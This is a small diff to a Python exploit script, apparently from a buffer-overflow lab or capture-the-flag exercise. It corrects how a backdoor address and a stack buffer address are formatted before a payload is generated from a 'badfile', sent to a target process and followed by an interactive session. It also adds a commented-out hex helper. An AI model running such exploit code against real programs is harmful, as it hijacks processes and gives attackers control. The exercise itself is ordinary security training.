@@ -18,7 +18,7 @@ p.info('local buf address: 0x%x', addr)
 
 # p.recvuntil('name? ')
 # payload = input()
-input = f'0x{hex(bdoor)} 0x{hex(addr)}'.encode('utf-8')
+input = f'{hex(bdoor)} {hex(addr)}'.encode('utf-8')
 print('input=', input)
 subprocess.run('./gen_badfile', input=input);
 with open("./badfile", "rb") as f:
@@ -30,3 +30,7 @@ p.sendline(payload)
 
 # set control to the terminal
 p.interactive()
+
+
+# def str_to_hex(s):
+#     return ''.join([hex(ord(c)).replace('0x', '\x') for c in s])
